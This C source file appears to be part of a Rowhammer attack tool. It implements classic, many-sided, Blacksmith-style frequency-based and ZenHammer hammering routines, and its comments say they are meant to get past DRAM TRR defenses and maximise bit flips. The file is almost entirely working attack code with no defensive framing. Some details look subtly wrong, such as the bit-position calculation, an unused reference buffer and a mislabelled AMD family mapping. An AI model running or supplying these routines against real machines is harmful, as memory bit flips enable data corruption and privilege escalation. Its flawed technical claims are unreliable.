#include "sidewinder.h"
#include <math.h>
#include <time.h>

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

static inline void hammer_row(uint8_t *row) {
    volatile uint8_t *p = (volatile uint8_t *)row;
    /* Non-temporal hint for maximum DRAM bandwidth */
    for (int i = 0; i < CACHE_LINE_SIZE; i += CACHE_LINE_SIZE) {
        (void)p[i];
    }
    _mm_clflush(row);
}

void sw_hammer_classic(uint8_t *aggressor_a, uint8_t *aggressor_b, int iterations) {
    for (int i = 0; i < iterations; i++) {
        hammer_row(aggressor_a);
        hammer_row(aggressor_b);
        _mm_mfence();
    }
}

/* Generate non-uniform hammer pattern based on frequency/phase/amplitude.
 * Model: activation_interval[i] = base_interval + amplitude * sin(2*pi*frequency*i + phase)
 * This is the Blacksmith/ZenHammer approach that bypasses TRR by making
 * activation timing irregular instead of uniform.
 */
void sw_hammer_frequency(uint8_t *buffer, uint64_t *row_addrs, int num_rows,
                         freq_pattern_set_t *patterns, int total_activations) {
    uint64_t *aggressors = (uint64_t *)malloc(num_rows * sizeof(uint64_t));
    for (int i = 0; i < num_rows; i++)
        aggressors[i] = row_addrs[i];

    int pat_idx = 0;
    struct timespec sleep_ns;

    for (int act = 0; act < total_activations; act++) {
        freq_pattern_t *pat = &patterns->patterns[pat_idx % patterns->num_patterns];
        pat_idx++;

        /* Hammer all aggressor rows in this pattern's iteration */
        for (int r = 0; r < num_rows; r++) {
            uint8_t *row = buffer + aggressors[r];
            for (int j = 0; j < CACHE_LINE_SIZE; j += CACHE_LINE_SIZE) {
                volatile uint8_t *p = (volatile uint8_t *)(row + j);
                (void)*p;
            }
            _mm_clflush(row);
        }
        _mm_mfence();

        /* Non-uniform delay based on Blacksmith model */
        double base = 150.0;
        double delay = base + pat->amplitude * sin(2.0 * M_PI * pat->frequency * act + pat->phase);

        if (delay < 50.0) delay = 50.0;
        if (delay > 5000.0) delay = 5000.0;

        sleep_ns.tv_sec = 0;
        sleep_ns.tv_nsec = (long)(delay);
        nanosleep(&sleep_ns, NULL);
    }

    free(aggressors);
}

void sw_hammer_many_sided(uint8_t *buffer, uint64_t *aggressor_addrs,
                          int num_aggressors, uint64_t victim_row,
                          int activations_per) {
    uint64_t victim_addr = victim_row;

    /* Round-robin hammer all aggressors */
    for (int i = 0; i < activations_per; i++) {
        for (int a = 0; a < num_aggressors; a++) {
            uint8_t *row = buffer + aggressor_addrs[a];
            for (int j = 0; j < CACHE_LINE_SIZE; j += CACHE_LINE_SIZE) {
                volatile uint8_t *p = (volatile uint8_t *)(row + j);
                (void)*p;
            }
            _mm_clflush(row);
        }
        _mm_mfence();
    }
}

int sw_check_flips(uint8_t *buffer, size_t size, hammer_result_t *result) {
    static uint8_t initial_ref[MAX_FLIPS * 2]; /* compare buffer stored elsewhere */
    int flips = 0;

    result->num_flips = 0;

    for (size_t i = 0; i < size && flips < MAX_FLIPS; i++) {
        uint8_t current = buffer[i];
        if (current != 0x41 && current != 0x00) {
            /* Unexpected value found - potential flip */
            result->flips[flips].addr = (uint64_t)(buffer + i);
            result->flips[flips].bit_pos = i % 8;
            result->flips[flips].from_val = 0x41;
            result->flips[flips].to_val = current;
            flips++;
        }
    }

    result->num_flips = flips;
    return flips;
}

double sw_refresh_interval_measure(void) {
    volatile uint64_t *addr = mmap(NULL, PAGE_SIZE,
                                   PROT_READ | PROT_WRITE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    double t_refi = 0;
    int samples = 0;
    uint64_t total_ns = 0;

    if (addr == MAP_FAILED) return 7800.0;

    *addr = 1;
    madvise((void *)addr, PAGE_SIZE, MADV_HUGEPAGE);

    for (int i = 0; i < 100; i++) {
        for (int j = 0; j < 1000; j++) {
            _mm_clflush((void *)addr);
            _mm_mfence();
            (void)*addr;
        }

        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        uint64_t start = ts.tv_sec * 1000000000ULL + ts.tv_nsec;

        /* Fast hammering loop - measure how many we can do before refresh */
        uint64_t iter = 0;
        while (iter < 5000000) {
            for (int k = 0; k < 8; k++) {
                _mm_clflush((void *)addr);
                _mm_mfence();
                (void)*addr;
                iter++;
            }

            /* Check time */
            clock_gettime(CLOCK_MONOTONIC, &ts);
            uint64_t now = ts.tv_sec * 1000000000ULL + ts.tv_nsec;
            if (now - start > 10000000ULL) break; /* 10ms windows */
        }

        clock_gettime(CLOCK_MONOTONIC, &ts);
        uint64_t end = ts.tv_sec * 1000000000ULL + ts.tv_nsec;
        total_ns += (end - start);
        samples++;
    }

    munmap((void *)addr, PAGE_SIZE);
    t_refi = (double)total_ns / (double)samples;
    return t_refi / 1000.0; /* return in microseconds */
}

void sw_generate_freq_patterns(freq_pattern_set_t *ps, int count) {
    if (count > MAX_PATTERNS) count = MAX_PATTERNS;
    ps->num_patterns = count;

    for (int i = 0; i < count; i++) {
        ps->patterns[i].frequency = 0.1 + ((double)i / count) * 2.0;
        ps->patterns[i].phase     = ((double)i * M_PI) / count;
        ps->patterns[i].amplitude = 20.0 + ((double)i / count) * 80.0;
        ps->patterns[i].pattern_id = i;
    }
}

/* ZenHammer - AMD Zen-specific Rowhammer for DDR4/DDR5.
 *
 * AMD Zen memory controllers have different characteristics than Intel:
 * - Different refresh behavior (tREFI varies by platform)
 * - Different TRR implementation (more relaxed on some DDR5)
 * - Different row buffer policy
 *
 * ZenHammer uses aggressive row-conflict patterns that exploit
 * AMD's memory controller to maximize bit flips on DDR5.
 *
 * Based on: "ZenHammer: Rowhammer on AMD Zen-based Platforms" (2024)
 */
void sw_zenhammer_hammer(uint8_t *buffer, uint64_t *row_addrs,
                         int num_rows, int aggressors_per_set,
                         int total_activations, int amd_family) {
    if (num_rows < 2 || aggressors_per_set < 1) return;

    /* ZenHammer parameters tuned for AMD Zen 2/3/4 */
    int burst_size = (amd_family >= 25) ? 8 : 4;  /* Zen 2+ = 8, Zen 1 = 4 */
    int burst_delay_ns = (amd_family >= 25) ? 55 : 110;  /* DDR5 vs DDR4 timing */

    struct timespec sleep_ns;
    sleep_ns.tv_sec = 0;

    for (int act = 0; act < total_activations; act++) {
        /* Phase 1: Rapid burst to same row (row-buffer hit) */
        for (int burst = 0; burst < burst_size; burst++) {
            for (int r = 0; r < num_rows && r < aggressors_per_set; r++) {
                uint8_t *row = buffer + row_addrs[r];
                volatile uint8_t *p = (volatile uint8_t *)row;
                (void)*p;
                _mm_clflush(row);
            }
            _mm_mfence();
        }

        /* Phase 2: Quick switch to different rows (row-conflict) */
        for (int r = aggressors_per_set; r < num_rows && r < aggressors_per_set * 2; r++) {
            uint8_t *row = buffer + row_addrs[r];
            volatile uint8_t *p = (volatile uint8_t *)row;
            (void)*p;
            _mm_clflush(row);
        }
        _mm_mfence();

        /* Phase 3: Variable delay to bypass TRR */
        double variation = sin(2.0 * M_PI * 0.7 * act) * 20.0;
        int delay = burst_delay_ns + (int)variation;
        if (delay < 10) delay = 10;

        sleep_ns.tv_nsec = delay;
        nanosleep(&sleep_ns, NULL);
    }
}
